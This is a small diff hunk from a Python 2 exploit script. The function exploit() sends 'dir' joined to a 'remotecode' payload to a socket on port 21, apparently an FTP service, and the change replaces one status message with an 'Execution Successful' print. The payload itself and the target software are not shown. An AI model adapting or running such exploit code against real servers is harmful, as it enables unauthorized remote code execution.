@@ -104,8 +104,8 @@ def exploit(ip,port=21,TIMEOUT=10):
 	message = 'dir' + remotecode
 	s.send(message)
 	print "[*] Payload Sent"
-	print "[*] Getting Response:"
 	print byte_pbyte(s.recv(1024))
+	print "[*] Execution Successful"
 	s.close()
 	print
 
